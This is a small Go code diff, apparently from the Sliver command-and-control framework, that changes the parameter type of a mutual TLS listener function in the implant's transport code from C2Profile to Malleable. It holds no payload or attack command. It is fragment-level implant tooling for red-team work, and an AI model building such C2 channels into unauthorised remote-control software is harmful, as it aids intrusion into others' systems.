@@ -36,7 +36,7 @@ import (
 
 // Listen - Listen on the target for incoming server mutual TLS connections.
 // The uri is mandatory, and the TransportProfile is needed for its credentials.
-func Listen(uri *url.URL, p *sliverpb.C2Profile) (c net.Conn, err error) {
+func Listen(uri *url.URL, p *sliverpb.Malleable) (c net.Conn, err error) {
 
 	// {{if .Config.Debug}}
 	log.Printf("Connecting -> %s", uri.Host)
